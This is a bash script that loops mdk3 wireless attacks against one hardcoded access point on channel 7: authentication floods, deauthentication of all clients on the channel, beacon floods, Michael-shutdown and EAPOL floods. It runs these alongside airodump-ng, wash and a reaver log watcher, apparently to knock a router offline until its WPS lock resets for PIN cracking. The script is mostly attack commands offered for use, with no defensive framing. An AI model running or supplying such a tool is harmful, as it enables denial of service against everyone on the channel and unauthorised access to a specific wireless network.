#!/bin/bash

# ══ Regular color ════════╗ START ╔═
    BK=$(tput setaf 232)  # Black
    GY=$(tput setaf 246)  # Gray
    RD=$(tput setaf 160)  # Red
    GR=$(tput setaf 46)   # Green CKeyfound CSearch
    YW=$(tput setaf 226)  # Yellow CFound
    OR=$(tput setaf 208)  # Orange / CDump
    BL=$(tput setaf 80)   # Blue
    MG=$(tput setaf 129)  # Magenta
    PR=$(tput setaf 198)  # Purple
    CY=$(tput setaf 14)   # Cyan
    WH=$(tput setaf 15)   # White
    NM=$(tput sgr0)       # Norm
    BD=$(tput bold)       # Bold
    BG=$(tput setab 3)    # Background Color
# ══ Regular color ════════╝  END  ╚═

# ══ Move cursor ════════╗ START ╔═
    SVC=$(tput sc)      # save position
    RSC=$(tput rc)      # restore position
    NRC=$(tput cnorm)   # back position to norm
    UPC=$(tput cuu1)    # up position 1 line
    DWC=$(tput cud1)    # down position 1 line
    LFC=$(tput cub1)    # left position 1 line
    RGC=$(tput cuf1)    # right position 1 line
    CL1=$(tput el)      # clean line <==|
    CL2=$(tput el1)     # clean line |==>
# ══ Move cursor ════════╝  END  ╚═

#╔══════════════════════════════════════════════╗
#║  Exit and Clear temp files
#╚══════════════════════════════════════════════╝
exit_function() {
	killall airodump-ng &>/dev/null
	killall reaver &>/dev/null
	killall xterm &>/dev/null
	killall wash &>/dev/null
	killall tail &>/dev/null
	echo -e "${NM}${WH}  [${NM}${RD}!${NM}${WH}] Remove temporary file ."
	sleep 1
	echo ""
	exit
}
#╚══════════════════════════════  End Exit and Clear temp files ═╝
trap exit_function SIGINT
echo ""
INFACE_SET=`iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}'`
if [[ -z "$INFACE_SET" ]]
	then
		IMANAGED=`iwconfig 2>/dev/null | grep 'Mode:Managed' -B 1 | grep -Ev 'Mode:Managed' | awk '{print $1}'`
		if [[ -n "$IMANAGED" ]]
			then
				airmon-ng start $IMANAGED &>/dev/null
		fi
fi
clear
INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'`
if [[ -n "$INFACE" ]];
	then
		while true
			do
				rm -f reaverlog.txt
				xterm -e airodump-ng -i ${INFACE} -c 7 --bssid 14:CC:20:BA:1F:CA &
				xterm -e airodump-ng -i ${INFACE} -c 7 --bssid 14:CC:20:BA:1F:CA &
				xterm -e timeout 2m mdk3 ${INFACE} a -a 14:CC:20:BA:1F:CA &
				xterm -e timeout 2m mdk3 ${INFACE} d -c 7 &
				xterm -e timeout 2m mdk3 ${INFACE} d -c 7 &
				xterm -e timeout 2m mdk3 ${INFACE} d -c 7 &
				xterm -e timeout 2m mdk3 ${INFACE} b -t 14:CC:20:BA:1F:CA -c 7 &
				xterm -e timeout 2m mdk3 ${INFACE} b -t 14:CC:20:BA:1F:CA -c 7 &
				xterm -e timeout 2m mdk3 ${INFACE} b -t 14:CC:20:BA:1F:CA -c 7 &
				xterm -e timeout 2m mdk3 ${INFACE} m -t 10:FE:ED:45:01:DC
				xterm -e timeout 3m mdk3 ${INFACE} x 0 -t 14:CC:20:BA:1F:CA -s 500
				xterm -e timeout 3m mdk3 ${INFACE} x 0 -t 14:CC:20:BA:1F:CA -s 500
				xterm -e timeout 3m mdk3 ${INFACE} x 0 -t 14:CC:20:BA:1F:CA -s 500
				xterm -e wash -i ${INFACE}
				tail -f reaverlog.txt &
				if
					tail -f reaverlog.txt | grep -q Detected
				then
					killall reaver
					killall wash
					killall tail
				fi
					killall airodump-ng &
					sleep 5m
		done

	else
		clear
		echo -e ""
		echo -e "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Wireless Card${NM}${RD} Not Found${NM}${WH} ."
		exit_function
fi